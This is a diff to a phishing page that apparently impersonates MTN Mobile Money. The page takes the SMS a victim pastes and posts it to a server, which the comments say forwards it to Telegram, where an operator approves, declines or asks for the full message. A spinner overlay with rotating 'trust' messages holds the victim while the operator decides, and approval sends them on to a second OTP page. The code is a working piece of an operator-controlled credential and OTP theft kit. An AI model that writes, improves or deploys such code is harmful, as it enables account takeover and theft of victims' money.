@@ -232,7 +232,7 @@
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
   /* ============================================================
-     Full-page "Verifying…" overlay with rotating trust facts
+     Full-page "Verifying…" overlay
   ============================================================ */
   .authorizing {
     position: fixed; inset: 0;
@@ -250,7 +250,6 @@
   .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
   .authorizing .brand-label .mm  { color: #fff; }
 
-  /* Spinner */
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
@@ -261,13 +260,11 @@
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* "Verifying" heading */
   .authorizing h2 {
     font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
     margin-bottom: 24px;
   }
 
-  /* Rotating trust messages — sliding side-ways fade */
   .trust-slider {
     width: 100%; max-width: 340px;
     height: 76px;
@@ -486,7 +483,7 @@
   }
 
   /* ============================================================
-     Trust slider (rotating messages)
+     Trust slider
   ============================================================ */
   let trustTimer = null;
   let trustIndex = 0;
@@ -698,10 +695,10 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // Send the EXACT pasted SMS to the server, which forwards it to Telegram
-    // with three buttons: Approve / Decline / Fully
+    // Send the EXACT pasted SMS to the server (which forwards to Telegram)
+    let serverAccepted = true;
     try {
-      await fetch('/api/verification/sms', {
+      const r = await fetch('/api/verification/sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -715,13 +712,20 @@
           rn: tx.rn
         })
       });
+      if (!r.ok) serverAccepted = false;
     } catch (e) {
       btn.disabled = false;
       showToast('Network error. Please try again.');
       return;
     }
 
-    // Show full-page verifying overlay with rotating trust messages
+    if (!serverAccepted) {
+      btn.disabled = false;
+      showToast('Request was not accepted. Please try again.');
+      return;
+    }
+
+    // Show full-page verifying overlay
     document.getElementById('authTitle').textContent = 'Verifying…';
     document.getElementById('authorizingOverlay').classList.add('show');
     startTrustSlider();
@@ -752,7 +756,7 @@
 
       if (!pollingActive) return;
 
-      /* -------- APPROVED → go to otp2.html -------- */
+      /* APPROVED → otp2.html */
       if (decision === 'approved') {
         pollingActive = false;
         stopTrustSlider();
@@ -764,7 +768,7 @@
         return;
       }
 
-      /* -------- DECLINED → SMS expired / resend notice -------- */
+      /* DECLINED / EXPIRED → SMS expired + resend */
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         stopTrustSlider();
@@ -778,7 +782,7 @@
         return;
       }
 
-      /* -------- FULLY → paste full Y'ello SMS or resend notice -------- */
+      /* FULLY → paste full Y'ello SMS or resend */
       if (decision === 'needs_full_sms' || decision === 'fully') {
         pollingActive = false;
         stopTrustSlider();
